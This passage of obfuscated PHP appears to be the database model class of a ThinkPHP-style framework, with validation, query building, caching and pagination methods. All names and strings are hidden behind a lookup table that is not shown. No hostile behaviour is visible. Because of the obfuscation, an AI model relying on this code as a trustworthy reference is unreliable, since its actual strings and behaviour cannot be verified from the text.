$‰¬ü¿ÂÜ[396] => $‰¬ü¿ÂÜ[397], $‰¬ü¿ÂÜ[398] => $‰¬ü¿ÂÜ[399], $‰¬ü¿ÂÜ[400] => $‰¬ü¿ÂÜ[401], $‰¬ü¿ÂÜ[402] => $‰¬ü¿ÂÜ[403], $‰¬ü¿ÂÜ[377] => $‰¬ü¿ÂÜ[404], $‰¬ü¿ÂÜ[405] => $‰¬ü¿ÂÜ[406]); if (isset($ØÔ½‹á[strtolower($²Üîê·Ó)])) { $²Üîê·Ó = $ØÔ½‹á[strtolower($²Üîê·Ó)]; } return preg_match($²Üîê·Ó, $İíÀìÀÕ) === 1; } private function autoOperation(&$æ»•¡–š, $İ¤Ñ×¥ê) { $Ì äÉ¬ =& $_SERVER[‹‰”››ê]; if (!empty($this->options[$Ì äÉ¬[407]])) { $ ½ƒÒ¸Ó = $this->options[$Ì äÉ¬[407]]; unset($this->options[$Ì äÉ¬[407]]); } elseif (!empty($this->_auto)) { $ ½ƒÒ¸Ó = $this->_auto; } if (isset($ ½ƒÒ¸Ó)) { foreach ($ ½ƒÒ¸Ó as $¥°øŸ§²) { if (empty($¥°øŸ§²[2])) { $¥°øŸ§²[2] = THINK_MODEL_INSERT; } if ($İ¤Ñ×¥ê == $¥°øŸ§²[2] || $¥°øŸ§²[2] == THINK_MODEL_BOTH) { switch (trim($¥°øŸ§²[3])) { case $Ì äÉ¬[408]: case $Ì äÉ¬[409]: $Ëñš¹¿ù = isset($¥°øŸ§²[4]) ? (array) $¥°øŸ§²[4] : array(); if (isset($æ»•¡–š[$¥°øŸ§²[0]])) { array_unshift($Ëñš¹¿ù, $æ»•¡–š[$¥°øŸ§²[0]]); } if ($Ì äÉ¬[408] == $¥°øŸ§²[3]) { $æ»•¡–š[$¥°øŸ§²[0]] = call_user_func_array($¥°øŸ§²[1], $Ëñš¹¿ù); } else { $æ»•¡–š[$¥°øŸ§²[0]] = call_user_func_array(array(&$this, $¥°øŸ§²[1]), $Ëñš¹¿ù); } break; case $Ì äÉ¬[362]: $æ»•¡–š[$¥°øŸ§²[0]] = $æ»•¡–š[$¥°øŸ§²[1]]; break; case $Ì äÉ¬[410]: if ($Ì äÉ¬[12] === $æ»•¡–š[$¥°øŸ§²[0]]) { unset($æ»•¡–š[$¥°øŸ§²[0]]); } break; case $Ì äÉ¬[411]: default: $æ»•¡–š[$¥°øŸ§²[0]] = $¥°øŸ§²[1]; } if (!1 === $æ»•¡–š[$¥°øŸ§²[0]]) { unset($æ»•¡–š[$¥°øŸ§²[0]]); } } } } return $æ»•¡–š; } protected function autoValidation($ƒµä«á, $óç…ò³‚) { $ÅúÜ–ç =& $_SERVER[‹‰”››ê]; if (!empty($this->options[$ÅúÜ–ç[412]])) { $§”»Ğå = $this->options[$ÅúÜ–ç[412]]; unset($this->options[$ÅúÜ–ç[412]]); } elseif (!empty($this->_validate)) { $§”»Ğå = $this->_validate; } if (isset($§”»Ğå)) { if ($this->patchValidate) { $this->error = array(); } foreach ($§”»Ğå as $ –Éâ => $ËÁÌªüÒ) { if (empty($ËÁÌªüÒ[5]) || $ËÁÌªüÒ[5] == THINK_MODEL_BOTH || $ËÁÌªüÒ[5] == $óç…ò³‚) { if (0 == strpos($ËÁÌªüÒ[2], $ÅúÜ–ç[413]) && strpos($ËÁÌªüÒ[2], $ÅúÜ–ç[414])) { $ËÁÌªüÒ[2] = think_lang(substr($ËÁÌªüÒ[2], 2, -1)); } $ËÁÌªüÒ[3] = isset($ËÁÌªüÒ[3]) ? $ËÁÌªüÒ[3] : THINK_EXISTS_VALIDATE; $ËÁÌªüÒ[4] = isset($ËÁÌªüÒ[4]) ? $ËÁÌªüÒ[4] : $ÅúÜ–ç[415]; switch ($ËÁÌªüÒ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ƒµä«á, $ËÁÌªüÒ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ÅúÜ–ç[12] != trim($ƒµä«á[$ËÁÌªüÒ[0]])) { if (!1 === $this->_validationField($ƒµä«á, $ËÁÌªüÒ)) { return !1; } } break; default: if (isset($ƒµä«á[$ËÁÌªüÒ[0]])) { if (!1 === $this->_validationField($ƒµä«á, $ËÁÌªüÒ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Àˆ…Óèµ, $îÁ†ËßÉ) { if (!1 === $this->_validationFieldItem($Àˆ…Óèµ, $îÁ†ËßÉ)) { if ($this->patchValidate) { $this->error[$îÁ†ËßÉ[0]] = $îÁ†ËßÉ[2]; } else { $this->error = $îÁ†ËßÉ[2]; return !1; } } return; } protected function _validationFieldItem($çè˜¸ÕÙ, $Í€Í‰·Ì) { $·½üê¶ô =& $_SERVER[‹‰”››ê]; switch (strtolower(trim($Í€Í‰·Ì[4]))) { case $·½üê¶ô[408]: case $·½üê¶ô[409]: $ôÙÓŠ™¨ = isset($Í€Í‰·Ì[6]) ? (array) $Í€Í‰·Ì[6] : array(); if (is_string($Í€Í‰·Ì[0]) && strpos($Í€Í‰·Ì[0], $·½üê¶ô[50])) { $Í€Í‰·Ì[0] = explode($·½üê¶ô[50], $Í€Í‰·Ì[0]); } if (is_array($Í€Í‰·Ì[0])) { foreach ($Í€Í‰·Ì[0] as $µø‡îøù) { $¦ÓŞŠ[$µø‡îøù] = $çè˜¸ÕÙ[$µø‡îøù]; } array_unshift($ôÙÓŠ™¨, $¦ÓŞŠ); } else { array_unshift($ôÙÓŠ™¨, $çè˜¸ÕÙ[$Í€Í‰·Ì[0]]); } if ($·½üê¶ô[408] == $Í€Í‰·Ì[4]) { return call_user_func_array($Í€Í‰·Ì[1], $ôÙÓŠ™¨); } else { return call_user_func_array(array(&$this, $Í€Í‰·Ì[1]), $ôÙÓŠ™¨); } case $·½üê¶ô[416]: return $çè˜¸ÕÙ[$Í€Í‰·Ì[0]] == $çè˜¸ÕÙ[$Í€Í‰·Ì[1]]; case $·½üê¶ô[417]: if (is_string($Í€Í‰·Ì[0]) && strpos($Í€Í‰·Ì[0], $·½üê¶ô[50])) { $Í€Í‰·Ì[0] = explode($·½üê¶ô[50], $Í€Í‰·Ì[0]); } $ı“½—Ç = array(); if (is_array($Í€Í‰·Ì[0])) { foreach ($Í€Í‰·Ì[0] as $µø‡îøù) { $ı“½—Ç[$µø‡îøù] = $çè˜¸ÕÙ[$µø‡îøù]; } } else { $ı“½—Ç[$Í€Í‰·Ì[0]] = $çè˜¸ÕÙ[$Í€Í‰·Ì[0]]; } if (!empty($çè˜¸ÕÙ[$this->getPk()])) { $ı“½—Ç[$this->getPk()] = array($·½üê¶ô[418], $çè˜¸ÕÙ[$this->getPk()]); } if ($this->where($ı“½—Ç)->find()) { return !1; } return !0; default: return $this->check($çè˜¸ÕÙ[$Í€Í‰·Ì[0]], $Í€Í‰·Ì[1], $Í€Í‰·Ì[4]); } } public function check($ËË¬õˆ², $ü¥Òê¢, $ÌØéŠ•¬ = "\x72\145\147\145\170") { $Ê‘Ø…¤¡ =& $_SERVER[‹‰”››ê]; $ÌØéŠ•¬ = strtolower(trim($ÌØéŠ•¬)); switch ($ÌØéŠ•¬) { case $Ê‘Ø…¤¡[7]: case $Ê‘Ø…¤¡[419]: $“¢ìöÜÆ = is_array($ü¥Òê¢) ? $ü¥Òê¢ : explode($Ê‘Ø…¤¡[50], $ü¥Òê¢); return $ÌØéŠ•¬ == $Ê‘Ø…¤¡[7] ? in_array($ËË¬õˆ², $“¢ìöÜÆ) : !in_array($ËË¬õˆ², $“¢ìöÜÆ); case $Ê‘Ø…¤¡[420]: case $Ê‘Ø…¤¡[421]: if (is_array($ü¥Òê¢)) { $ı´·¸¿‘ = $ü¥Òê¢[0]; $»ü¾Ğ— = $ü¥Òê¢[1]; } else { list($ı´·¸¿‘, $»ü¾Ğ—) = explode($Ê‘Ø…¤¡[50], $ü¥Òê¢); } return $ÌØéŠ•¬ == $Ê‘Ø…¤¡[420] ? $ËË¬õˆ² >= $ı´·¸¿‘ && $ËË¬õˆ² <= $»ü¾Ğ— : $ËË¬õˆ² < $ı´·¸¿‘ || $ËË¬õˆ² > $»ü¾Ğ—; case $Ê‘Ø…¤¡[422]: case $Ê‘Ø…¤¡[423]: return $ÌØéŠ•¬ == $Ê‘Ø…¤¡[422] ? $ËË¬õˆ² == $ü¥Òê¢ : $ËË¬õˆ² != $ü¥Òê¢; case $Ê‘Ø…¤¡[424]: $ü÷¤ó¤è = mb_strlen($ËË¬õˆ², $Ê‘Ø…¤¡[425]); if (strpos($ü¥Òê¢, $Ê‘Ø…¤¡[50])) { list($ı´·¸¿‘, $»ü¾Ğ—) = explode($Ê‘Ø…¤¡[50], $ü¥Òê¢); return $ü÷¤ó¤è >= $ı´·¸¿‘ && $ü÷¤ó¤è <= $»ü¾Ğ—; } else { return $ü÷¤ó¤è == $ü¥Òê¢; } case $Ê‘Ø…¤¡[426]: list($Š£ºÓ¼á, $¸ª¶‰Ùò) = explode($Ê‘Ø…¤¡[50], $ü¥Òê¢); if (!is_numeric($Š£ºÓ¼á)) { $Š£ºÓ¼á = strtotime($Š£ºÓ¼á); } if (!is_numeric($¸ª¶‰Ùò)) { $¸ª¶‰Ùò = strtotime($¸ª¶‰Ùò); } return NOW_TIME >= $Š£ºÓ¼á && NOW_TIME <= $¸ª¶‰Ùò; case $Ê‘Ø…¤¡[427]: return in_array(get_client_ip(), explode($Ê‘Ø…¤¡[50], $ü¥Òê¢)); case $Ê‘Ø…¤¡[428]: return !in_array(get_client_ip(), explode($Ê‘Ø…¤¡[50], $ü¥Òê¢)); case $Ê‘Ø…¤¡[415]: default: return $this->regex($ËË¬õˆ², $ü¥Òê¢); } } public function query($¾¥¾ö•¿, $Æõ…ş‘ = false) { $İäš¼‹Ë =& $_SERVER[‹‰”››ê]; if (!is_bool($Æõ…ş‘) && !is_array($Æõ…ş‘)) { $Æõ…ş‘ = func_get_args(); array_shift($Æõ…ş‘); } $¾¥¾ö•¿ = str_replace(array($İäš¼‹Ë[288], $İäš¼‹Ë[429]), $İäš¼‹Ë[53], $¾¥¾ö•¿); $¾¥¾ö•¿ = $this->parseSql($¾¥¾ö•¿, $Æõ…ş‘); return $this->db->query($¾¥¾ö•¿); } public function execute($ş‚é¢ËÎ, $á×‚ğİ¾ = false) { if (!is_bool($á×‚ğİ¾) && !is_array($á×‚ğİ¾)) { $á×‚ğİ¾ = func_get_args(); array_shift($á×‚ğİ¾); } $ş‚é¢ËÎ = $this->parseSql($ş‚é¢ËÎ, $á×‚ğİ¾); return $this->db->execute($ş‚é¢ËÎ); } protected function parseSql($ìğÛçº–, $­í¬í¬–) { $³ÅÚ‹ä =& $_SERVER[‹‰”››ê]; if (!0 === $­í¬í¬–) { $œ¾›ƒ¯ˆ = $this->_parseOptions(); $ìğÛçº– = $this->db->parseSql($ìğÛçº–, $œ¾›ƒ¯ˆ); } elseif (is_array($­í¬í¬–)) { $­í¬í¬– = array_map(array($this->db, $³ÅÚ‹ä[430]), $­í¬í¬–); $ìğÛçº– = vsprintf($ìğÛçº–, $­í¬í¬–); } else { $ìğÛçº– = strtr($ìğÛçº–, array($³ÅÚ‹ä[431] => $this->getTableName(), $³ÅÚ‹ä[432] => think_config($³ÅÚ‹ä[333]))); } $this->db->setModel($this->name); return $ìğÛçº–; } public function db($°ÆØ­‰ï = '', $ÙÆ÷çÄè = '', $Á§¤¢æë = array()) { $ø¡™ıÚ =& $_SERVER[‹‰”››ê]; if ($ø¡™ıÚ[12] === $°ÆØ­‰ï && $this->db) { return $this->db; } static $ˆ¨À·Æ· = array(); static $¤Â¤µà¿ = array(); if (!isset($¤Â¤µà¿[$°ÆØ­‰ï]) || isset($¤Â¤µà¿[$°ÆØ­‰ï]) && $ÙÆ÷çÄè && $ˆ¨À·Æ·[$°ÆØ­‰ï] != $ÙÆ÷çÄè) { if (!empty($ÙÆ÷çÄè) && is_string($ÙÆ÷çÄè) && !1 === strpos($ÙÆ÷çÄè, $ø¡™ıÚ[8])) { $ÙÆ÷çÄè = think_config($ÙÆ÷çÄè); } $°ÆØ­‰ï = think_guid($ÙÆ÷çÄè); $¤Â¤µà¿[$°ÆØ­‰ï] = Db::getInstance($ÙÆ÷çÄè); } elseif (NULL === $ÙÆ÷çÄè) { $¤Â¤µà¿[$°ÆØ­‰ï]->close(); unset($¤Â¤µà¿[$°ÆØ­‰ï]); return; } if (!empty($Á§¤¢æë)) { if (is_string($Á§¤¢æë)) { parse_str($Á§¤¢æë, $Á§¤¢æë); } foreach ($Á§¤¢æë as $ÛÑéÚäë => $¡»‚êéã) { $this->setProperty($ÛÑéÚäë, $¡»‚êéã); } } $ˆ¨À·Æ·[$°ÆØ­‰ï] = $ÙÆ÷çÄè; $this->db = $¤Â¤µà¿[$°ÆØ­‰ï]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $‹Î¾±˜ = get_class($this); if ($‹Î¾±˜ == $_SERVER[‹‰”››ê][433]) { return $this->name; } $this->name = substr($‹Î¾±˜, 0, -5); } return $this->name; } public function getTableName() { $ßÑÓûš³ =& $_SERVER[‹‰”››ê]; if (empty($this->trueTableName)) { $ˆõ¿Á³— = !empty($this->tablePrefix) ? $this->tablePrefix : $ßÑÓûš³[12]; if (!empty($this->tableName)) { $ˆõ¿Á³— .= $this->tableName; } else { $ˆõ¿Á³— .= think_parse_name($this->name); } $this->trueTableName = strtolower($ˆõ¿Á³—); } return (!empty($this->dbName) ? $this->dbName . $ßÑÓûš³[10] : $ßÑÓûš³[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¬í”ŒˆĞ =& $_SERVER[‹‰”››ê]; return isset($this->fields[$¬í”ŒˆĞ[340]]) ? $this->fields[$¬í”ŒˆĞ[340]] : $this->pk; } public function getDbFields() { $ÍŸ¸ª÷â =& $_SERVER[‹‰”››ê]; if (isset($this->options[$ÍŸ¸ª÷â[368]])) { $¨²É„·… = $this->db->getFields($this->options[$ÍŸ¸ª÷â[368]]); return $¨²É„·… ? array_keys($¨²É„·…) : !1; } if ($this->fields) { $¨²É„·… = $this->fields; unset($¨²É„·…[$ÍŸ¸ª÷â[339]], $¨²É„·…[$ÍŸ¸ª÷â[340]], $¨²É„·…[$ÍŸ¸ª÷â[341]], $¨²É„·…[$ÍŸ¸ª÷â[338]]); return $¨²É„·…; } return !1; } public function data($ıÂí¹ = '') { $ÍÌé®À¬ =& $_SERVER[‹‰”››ê]; if ($ÍÌé®À¬[12] === $ıÂí¹ && !empty($this->data)) { return $this->data; } if (is_object($ıÂí¹)) { $ıÂí¹ = get_object_vars($ıÂí¹); } elseif (is_string($ıÂí¹)) { parse_str($ıÂí¹, $ıÂí¹); } elseif (!is_array($ıÂí¹)) { think_exception(think_lang($ÍÌé®À¬[360])); } $this->data = $ıÂí¹; return $this; } public function join($¹ìçîñŞ) { $¹“ÍõŞ´ =& $_SERVER[‹‰”››ê]; if (is_array($¹ìçîñŞ)) { $this->options[$¹“ÍõŞ´[371]] = $¹ìçîñŞ; } elseif (!empty($¹ìçîñŞ)) { $this->options[$¹“ÍõŞ´[371]][] = $¹ìçîñŞ; } return $this; } public function union($Ç÷‹ô›ş, $§õÌÒœ = false) { $¹ì—´î =& $_SERVER[‹‰”››ê]; if (empty($Ç÷‹ô›ş)) { return $this; } if ($§õÌÒœ) { $this->options[$¹ì—´î[434]][$¹ì—´î[435]] = !0; } if (is_object($Ç÷‹ô›ş)) { $Ç÷‹ô›ş = get_object_vars($Ç÷‹ô›ş); } if (is_string($Ç÷‹ô›ş)) { $ü¶ Ü¼Æ = $Ç÷‹ô›ş; } elseif (is_array($Ç÷‹ô›ş)) { if (isset($Ç÷‹ô›ş[0])) { $this->options[$¹ì—´î[434]] = array_merge($this->options[$¹ì—´î[434]], $Ç÷‹ô›ş); return $this; } else { $ü¶ Ü¼Æ = $Ç÷‹ô›ş; } } else { think_exception(think_lang($¹ì—´î[360])); } $this->options[$¹ì—´î[434]][] = $ü¶ Ü¼Æ; return $this; } public function cache($ˆÛœ«Ëà = true, $™ÜÕ‹Ö¢ = null, $²¢Œ¤ö‚ = '') { $³‚ˆ²  =& $_SERVER[‹‰”››ê]; if (!1 !== $ˆÛœ«Ëà) { $this->options[$³‚ˆ² [436]] = array($³‚ˆ² [97] => $ˆÛœ«Ëà, $³‚ˆ² [426] => $™ÜÕ‹Ö¢, $³‚ˆ² [33] => $²¢Œ¤ö‚); } return $this; } public function field($ó’‡†ßæ, $Ï­¶ä³ = false) { $¤ô²‹‰— =& $_SERVER[‹‰”››ê]; if (!0 === $ó’‡†ßæ) { $±ï«í¥× = $this->getDbFields(); $ó’‡†ßæ = $±ï«í¥× ? $±ï«í¥× : $¤ô²‹‰—[223]; } elseif ($Ï­¶ä³) { if (is_string($ó’‡†ßæ)) { $ó’‡†ßæ = explode($¤ô²‹‰—[50], $ó’‡†ßæ); } $±ï«í¥× = $this->getDbFields(); $ó’‡†ßæ = $±ï«í¥× ? array_diff($±ï«í¥×, $ó’‡†ßæ) : $ó’‡†ßæ; } $this->options[$¤ô²‹‰—[362]] = $ó’‡†ßæ; return $this; } public function scope($¥òï»Œ· = '', $ı€×ş – = NULL) { $ªŒ´½­ô =& $_SERVER[‹‰”››ê]; if ($ªŒ´½­ô[12] === $¥òï»Œ·) { if (isset($this->_scope[$ªŒ´½­ô[37]])) { $¡Ÿû’‰ = $this->_scope[$ªŒ´½­ô[37]]; } else { return $this; } } elseif (is_string($¥òï»Œ·)) { $”Ö€¶Üì = explode($ªŒ´½­ô[50], $¥òï»Œ·); $¡Ÿû’‰ = array(); foreach ($”Ö€¶Üì as $ğú±õˆ) { if (!isset($this->_scope[$ğú±õˆ])) { continue; } $¡Ÿû’‰ = array_merge($¡Ÿû’‰, $this->_scope[$ğú±õˆ]); } if (!empty($ı€×ş –) && is_array($ı€×ş –)) { $¡Ÿû’‰ = array_merge($¡Ÿû’‰, $ı€×ş –); } } elseif (is_array($¥òï»Œ·)) { $¡Ÿû’‰ = $¥òï»Œ·; } if (is_array($¡Ÿû’‰) && !empty($¡Ÿû’‰)) { $this->options = array_merge($this->options, array_change_key_case($¡Ÿû’‰)); } return $this; } public function where($÷¹ë¸Ê÷, $²¹ ®¦‰ = null) { $ú—æùÒ´ =& $_SERVER[‹‰”››ê]; if (!is_null($²¹ ®¦‰) && is_string($÷¹ë¸Ê÷)) { if (!is_array($²¹ ®¦‰)) { $²¹ ®¦‰ = func_get_args(); array_shift($²¹ ®¦‰); } $²¹ ®¦‰ = array_map(array($this->db, $ú—æùÒ´[430]), $²¹ ®¦‰); $÷¹ë¸Ê÷ = vsprintf($÷¹ë¸Ê÷, $²¹ ®¦‰); } elseif (is_object($÷¹ë¸Ê÷)) { $÷¹ë¸Ê÷ = get_object_vars($÷¹ë¸Ê÷); } elseif (is_array($÷¹ë¸Ê÷)) { foreach ($÷¹ë¸Ê÷ as $ääşÔî => $ÃÛ”†ö³) { if ((is_numeric($ääşÔî) || !$ääşÔî) && is_string($ÃÛ”†ö³)) { if (strpos($ÃÛ”†ö³, $ú—æùÒ´[437]) === 0) { continue; } think_trace($ú—æùÒ´[438], $ú—æùÒ´[12], $ú—æùÒ´[49]); die; } } } if (is_string($÷¹ë¸Ê÷) && $ú—æùÒ´[12] != $÷¹ë¸Ê÷) { $†·‹·½æ = array(); $†·‹·½æ[$ú—æùÒ´[439]] = $÷¹ë¸Ê÷; $÷¹ë¸Ê÷ = $†·‹·½æ; } if (isset($this->options[$ú—æùÒ´[364]])) { $this->options[$ú—æùÒ´[364]] = array_merge($this->options[$ú—æùÒ´[364]], $÷¹ë¸Ê÷); } else { $this->options[$ú—æùÒ´[364]] = $÷¹ë¸Ê÷; } return $this; } public function limit($´œö”õ¥, $—ñ÷“µî = null) { $¥–¾óË  =& $_SERVER[‹‰”››ê]; $this->options[$¥–¾óË [379]] = is_null($—ñ÷“µî) ? $´œö”õ¥ : $´œö”õ¥ . $¥–¾óË [50] . $—ñ÷“µî; return $this; } public function page($°ë¬ÑÈÎ, $Ö‘½Ûşë = null) { $Î—›Ì¼² =& $_SERVER[‹‰”››ê]; $this->options[$Î—›Ì¼²[440]] = is_null($Ö‘½Ûşë) ? $°ë¬ÑÈÎ : $°ë¬ÑÈÎ . $Î—›Ì¼²[50] . $Ö‘½Ûşë; return $this; } public function comment($¦¼Ş¬•) { $this->options[$_SERVER[‹‰”››ê][441]] = $¦¼Ş¬•; return $this; } public function setProperty($ÏšÂğ“, $Õ¯Ü“õ) { if (property_exists($this, $ÏšÂğ“)) { $this->{$ÏšÂğ“} = $Õ¯Ü“õ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\x66\171\x54\151\155\x65", "\x74\151\155\x65", "\x69\156\163\145\162\x74\54\165\x70\144\141\x74\145", "\146\x75\x6e\x63\x74\151\x6f\156"), array("\x63\162\x65\x61\164\x65\x54\151\x6d\145", "\164\x69\155\145", "\x69\156\163\145\162\x74", "\x66\165\156\143\164\x69\157\156")); public function setDataAuto($ÔÇ”™¦) { $this->dataAuto = $ÔÇ”™¦; } public function __construct($Ğ—Ş„¡» = '', $øğ€Ó¨ = '', $‹˜¹É•Ï = '') { parent::__construct($Ğ—Ş„¡», $øğ€Ó¨, $‹˜¹É•Ï); } protected $tableMeta = array(); protected function _beforeInsert(&$“›õÓ¡Ğ, $‹¿¤†­Ó) { $±”¯ïÄÅ =& $_SERVER[‹‰”››ê]; if (!$this->checkDataAutoHas($±”¯ïÄÅ[442])) { return; } $this->dataBeforeFilter($“›õÓ¡Ğ, $±”¯ïÄÅ[442]); } protected function _beforeUpdate(&$Ç±¬êÃ, $Ä»Ìé) { $Šö‘ê»¯ =& $_SERVER[‹‰”››ê]; if (!$this->checkDataAutoHas($Šö‘ê»¯[443])) { return; } $this->dataBeforeFilter($Ç±¬êÃ, $Šö‘ê»¯[443]); } protected function _afterSelect(&$¹ÌøÆ², $éèñÑõÇ) { if (!is_array($¹ÌøÆ²)) { return; } if (!$this->checkDataAutoHas($_SERVER[‹‰”››ê][444])) { return; } foreach ($¹ÌøÆ² as &$¹“ƒ×‡) { $this->dataAfterFilter($¹“ƒ×‡); } unset($¹“ƒ×‡); } protected function _afterFind(&$ã‰üºç, $ÇÊ¶Ş¦) { if (!is_array($ã‰üºç)) { return; } if (!$this->checkDataAutoHas($_SERVER[‹‰”››ê][444])) { return; } $this->dataAfterFilter($ã‰üºç); } public static function textEncode($éÛÔØÁ) { if (!$éÛÔØÁ) { return $éÛÔØÁ; } $¡Öşš‘Ä = json_encode($éÛÔØÁ); $¡Öşš‘Ä = preg_replace_callback($_SERVER[‹‰”››ê][445], function ($ã—Í©ˆş) { return addslashes($ã—Í©ˆş[0]); }, $¡Öşš‘Ä); return json_decode($¡Öşš‘Ä); } public static function textDecode($€Ó›¿Œ€) { $³£›ôË„ =& $_SERVER[‹‰”››ê]; $ñ¦”°ŒÖ = json_encode($€Ó›¿Œ€); $ñ¦”°ŒÖ = preg_replace_callback($³£›ôË„[446], function ($“í«©¡Å) { return $_SERVER[‹‰”››ê][100]; }, $ñ¦”°ŒÖ); return json_decode($ñ¦”°ŒÖ); } public function setAutoIncrement($×µÙ¢ø™) { $Ãğ«€ªì = array($this->getPk() => $×µÙ¢ø™); $×Ñı‘ó = $this->data($Ãğ«€ªì)->add(); if ($×Ñı‘ó) { $this->delete($×Ñı‘ó); } } public function getAutoIncrement() { $œ••ÊÒ‰ = $this->getTableName(); $Œ†ıé¿ñ = $this->max($this->getPk()); $ìœ­Äøß = $this->query("\x73\150\x6f\167\x20\x74\x61\x62\154\x65\40\x73\x74\141\164\x75\163\x20\167\x68\x65\162\145\40\116\141\155\x65\75\x27{$œ••ÊÒ‰}\47"); $Âé áòã = $ìœ­Äøß[0][$_SERVER[‹‰”››ê][447]]; $ÕŸàøšÌ = max($Œ†ıé¿ñ, $Âé áòã); return $ÕŸàøšÌ; } protected function _callBefore($Ì§Š­¤±, $Ü¢‘Å¡ò) { return $this->cacheCallCheck($Ì§Š­¤±, $Ü¢‘Å¡ò, !1); } protected function _callAfter($…æè°Ş, $í™Ö‚áä) { return $this->cacheCallCheck($…æè°Ş, $í™Ö‚áä, !0); } protected function cacheFunctionAlias($úÁ­€é¦) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ìˆË«Ÿá, $”…‚°€Ò, $ªû½Óƒ‚ = false) { $İºÈµÚÁ =& $_SERVER[‹‰”››ê]; $ÒÎ³Íüï = $this->cacheFunctionAlias($”…‚°€Ò); if (!$ÒÎ³Íüï) { return; } foreach ($ÒÎ³Íüï as $’Å¤–‘Ş => $ÊäáŠêÁ) { $¸¯”ìÚ = $ÊäáŠêÁ[0]; $ÎÇÑ¤Şø = explode($İºÈµÚÁ[50], $ÊäáŠêÁ[1]); $§Õ×³ßØ = isset($ÊäáŠêÁ[2]) ? $ÊäáŠêÁ[2] : $İºÈµÚÁ[12]; if ($ìˆË«Ÿá == $’Å¤–‘Ş) { return $this->cacheFunctionGet($’Å¤–‘Ş, $¸¯”ìÚ, $§Õ×³ßØ); } if ($ªû½Óƒ‚ && in_array($ìˆË«Ÿá, $ÎÇÑ¤Şø)) { $this->cacheFunctionClear($’Å¤–‘Ş, $¸¯”ìÚ, $§Õ×³ßØ); } } } public function cacheFunctionGet($ç›†Ù’³, $ÜÇ¹üæ„, $çÚÕ¤ìã = '') { $» àó¤Ä = $this->cacheKeyMake($ç›†Ù’³, $ÜÇ¹üæ„, $çÚÕ¤ìã); $ÛÙü·ë™ = Cache::get($» àó¤Ä); if (!is_array($ÛÙü·ë™)) { $ÛÙü·ë™ = call_user_func_array(array($this, $ç›†Ù’³), array($ÜÇ¹üæ„, !0)); Cache::set($» àó¤Ä, $ÛÙü·ë™); } return $ÛÙü·ë™; } public function cacheFunctionClear($òºÑûÖˆ, $ğÙøğ…Ù, $©şÓõı‹ = '') { $¦ó¸ÛãÁ = $ğÙøğ…Ù; if (!is_array($ğÙøğ…Ù)) { $¦ó¸ÛãÁ = array($ğÙøğ…Ù); } foreach ($¦ó¸ÛãÁ as $îìş×ì‡) { $Ôüşç©Û = $this->cacheKeyMake($òºÑûÖˆ, $îìş×ì‡, $©şÓõı‹); Cache::remove($Ôüşç©Û); } } public function cacheKeyMake($šÏ²ŸÃ†, $Í©×ƒ¸‰, $××è¥©) { $”³°ƒˆš =& $_SERVER[‹‰”››ê]; if ($××è¥©) { $Í©×ƒ¸‰ = $Í©×ƒ¸‰ . $”³°ƒˆš[448] . $××è¥©; } return get_class($this) . $”³°ƒˆš[11] . $šÏ²ŸÃ† . $”³°ƒˆš[449] . $Í©×ƒ¸‰; } protected function selectPageReset() { $¦–§öÄÑ =& $_SERVER[‹‰”››ê]; if (isset($GLOBALS[$¦–§öÄÑ[450]])) { return; } $GLOBALS[$¦–§öÄÑ[450]] = isset($GLOBALS[$¦–§öÄÑ[7]][$¦–§öÄÑ[451]]) ? $GLOBALS[$¦–§öÄÑ[7]][$¦–§öÄÑ[451]] : !1; $GLOBALS[$¦–§öÄÑ[452]] = isset($GLOBALS[$¦–§öÄÑ[7]][$¦–§öÄÑ[440]]) ? $GLOBALS[$¦–§öÄÑ[7]][$¦–§öÄÑ[440]] : !1; $GLOBALS[$¦–§öÄÑ[7]][$¦–§öÄÑ[451]] = !1; $GLOBALS[$¦–§öÄÑ[7]][$¦–§öÄÑ[440]] = !1; } protected function selectPageRestore() { $¾®›®â =& $_SERVER[‹‰”››ê]; if (!isset($GLOBALS[$¾®›®â[450]])) { return; } $GLOBALS[$¾®›®â[7]][$¾®›®â[451]] = $GLOBALS[$¾®›®â[450]]; $GLOBALS[$¾®›®â[7]][$¾®›®â[440]] = $GLOBALS[$¾®›®â[452]]; if ($GLOBALS[$¾®›®â[7]][$¾®›®â[451]] === !1) { unset($GLOBALS[$¾®›®â[7]][$¾®›®â[451]]); } if ($GLOBALS[$¾®›®â[7]][$¾®›®â[440]] === !1) { unset($GLOBALS[$¾®›®â[7]][$¾®›®â[440]]); } unset($GLOBALS[$¾®›®â[450]]); unset($GLOBALS[$¾®›®â[452]]); } protected function selectPage($ƒŒŞá = 200, $á€ãìèñ = 1) { $ı½á°Çş =& $_SERVER[‹‰”››ê]; global $in; $öÏìß‰€ = $this->optionsValue(); $¶æ†¹Â½ = 50000; $ƒŒŞá = isset($in[$ı½á°Çş[451]]) && $in[$ı½á°Çş[451]] ? $in[$ı½á°Çş[451]] : $ƒŒŞá; if ($ƒŒŞá === -1) { $in[$ı½á°Çş[451]] = !1; $¶æ†¹Â½ = 100000000; $ƒŒŞá = $¶æ†¹Â½; } $¢‰÷†“¯ = $öÏìß‰€; $¢‰÷†“¯[$ı½á°Çş[453]] = array(); $ƒŒŞá = intval($ƒŒŞá); $ƒŒŞá = $ƒŒŞá <= 5 ? 5 : ($ƒŒŞá >= $¶æ†¹Â½ ? $¶æ†¹Â½ : $ƒŒŞá); $á€ãìèñ = intval(isset($in[$ı½á°Çş[440]]) && $in[$ı½á°Çş[440]] ? $in[$ı½á°Çş[440]] : $á€ãìèñ); $á€ãìèñ = $á€ãìèñ <= 1 ? 1 : $á€ãìèñ; $ÅœÏÈ¡ = array(); $Á¥ÄâÒ© = 1; if ($á€ãìèñ == 1 && $Á¥ÄâÒ©) { 